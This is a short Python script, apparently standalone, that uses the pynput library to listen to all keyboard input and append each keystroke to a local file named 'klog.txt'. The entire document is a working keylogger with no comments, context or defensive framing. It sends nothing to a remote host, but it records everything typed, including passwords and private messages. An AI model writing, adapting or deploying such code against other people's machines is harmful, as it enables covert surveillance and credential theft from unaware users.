from pynput.keyboard import Key, Listener

filename = "klog.txt"

def on_press(key):
    with open(filename,'a+') as f:
        key_str = str(key)
        if "'" in key_str:
            f.write(key_str.replace("'",""))
        else:
            f.write("|" + key_str + "|")
        f.close()


with Listener(on_press=on_press) as listener:
    listener.join()